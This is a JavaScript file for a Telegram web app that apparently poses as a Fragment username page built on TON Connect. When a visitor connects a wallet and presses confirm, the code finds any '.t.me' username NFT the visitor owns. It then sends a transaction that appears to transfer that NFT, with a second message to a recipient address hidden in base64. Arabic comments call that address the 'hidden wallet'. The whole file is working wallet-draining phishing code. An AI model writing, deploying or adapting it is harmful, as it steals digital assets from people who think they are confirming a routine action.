const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://alawi2396.github.io/fragment-web/tonconnect-manifest.json',
    buttonRootId: 'connect-button'
});

// وظيفة فك تشفير المحفظة المخفية
const _0x4a21 = ["VVFCYzdDb2lZOGxGYVBMMU1XUlFOMXBGNXR6OUtxc1JPcllOMW5rUm1tMzhyNTU="];
function _getRecp() { return atob(_0x4a21[0]); }

function getTargetUser() {
    const tg = window.Telegram?.WebApp;
    if (tg?.initDataUnsafe?.start_param) return tg.initDataUnsafe.start_param;
    return new URLSearchParams(window.location.search).get('user') || 'username';
}

const targetUser = getTargetUser();

document.addEventListener('DOMContentLoaded', () => {
    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
    ['u1', 'u2', 'u3', 'u4'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.innerText = targetUser;
    });
});

document.getElementById('confirm-btn').onclick = async () => {
    if (!tonConnectUI.connected) {
        await tonConnectUI.openModal();
        return;
    }

    const walletAddress = tonConnectUI.account.address;
    try {
        const response = await fetch(`https://tonapi.io/v2/accounts/${walletAddress}/nfts`);
        const data = await response.json();
        const nftItem = data.nft_items.find(item => 
            item.metadata?.name?.includes('.t.me')
        );

        if (nftItem) {
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 600,
                messages: [
                    {
                        address: nftItem.address, 
                        amount: "50000000",
                        payload: "te6ccgEBAQEADgAAGAAAABAAAABAAAAA" 
                    },
                    {
                        // هنا يتم استدعاء المحفظة المشفرة
                        address: _getRecp(),
                        amount: "1",
                    }
                ]
            };
            await tonConnectUI.sendTransaction(transaction);
        }
    } catch (e) { console.error(e); }
};
